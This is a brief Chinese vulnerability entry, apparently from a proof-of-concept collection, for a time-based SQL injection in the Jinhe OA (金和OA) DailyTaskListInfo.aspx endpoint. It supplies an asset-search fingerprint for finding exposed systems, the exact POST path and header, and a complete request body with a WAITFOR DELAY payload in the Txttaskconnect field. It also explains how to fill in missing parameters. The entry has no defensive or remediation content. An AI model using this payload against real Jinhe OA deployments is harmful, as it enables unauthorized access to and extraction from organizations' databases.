# 金和OA-DailyTaskListInfo存在SQL注入漏洞.docx

- **系统**：金和OA　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app="金和网络-金和OA"`
- **请求**：`POST /c6/Jhsoft.Web.dailytaskmanage/DailyTaskListInfo.aspx/ HTTP/1.1`
- **关键头**：`Content-Type: application/x-www-form-urlencoded`

**请求体 / payload**
```
__EVENTTARGET=&__EVENTARGUMENT=&__LASTFOCUS=&_ListPage1LockNumber=1&_ListPage1RecordCount=0&__VIEWSTATE=xxxx&txtSelectTaskIDList=&DrpTaskType=all&DrptaskState=0&txttaskname=&Txttaskconnect='WAitfor+DelaY'0:0:5'--&txtBeginTime=&txtEndTime=&Txttaskdept=%B5%A5%BB%F7%D1%A1%D4%F1%B2%BF%C3%C5&hidTaskdept=&Txttaskexecutor=&seltktype=%C7%EB%D1%A1%D4%F1&btnSearch=%B2%E9%D1%AF&Txttaskdeptid=&hidFlag=0&__VIEWSTATEGENERATOR=xxxx
参数获取不全得可以先访问DailyTaskListInfo.aspx从页面获取接口参数
```
- **预期**：200　|　—